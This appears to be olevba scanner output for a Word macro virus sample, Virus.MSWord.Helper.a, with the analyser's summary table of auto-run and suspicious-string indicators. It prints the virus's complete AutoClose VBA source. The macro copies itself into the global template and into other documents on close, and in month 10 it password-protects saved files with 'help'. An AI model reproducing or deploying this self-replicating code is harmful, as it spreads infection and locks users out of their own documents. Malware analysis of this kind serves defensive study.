olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Helper.a-e22458e72f0f6eee92dc56f710138ba254745023
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Helper.a-e22458e72f0f6eee92dc56f710138ba254745023 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Helper.a-e22458e72f0f6eee92dc56f710138ba254745023 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim total
Dim infected
Dim cycle
Dim name_$
WordBasic.DisableInput 1
If Mid(WordBasic.[Date$](), 4, 2) = "10" Then
    WordBasic.ToolsOptionsSave Password:="help"
End If

total = WordBasic.CountMacros(0)
infected = 0

If total > 0 Then
    For cycle = 1 To total
        If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
            infected = 1
        End If
    Next cycle
End If

name_$ = WordBasic.[WindowName$]() + ":AutoClose"

If infected <> 1 Then
    WordBasic.MacroCopy name_$, "Global:AutoClose", 1
Else
    infected = 0
End If

If WordBasic.CountMacros(1) <> 0 Then
        infected = 1
End If

If infected = 0 Then
        WordBasic.FileSaveAs Format:=1
        WordBasic.MacroCopy "Global:AutoClose", name_$
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

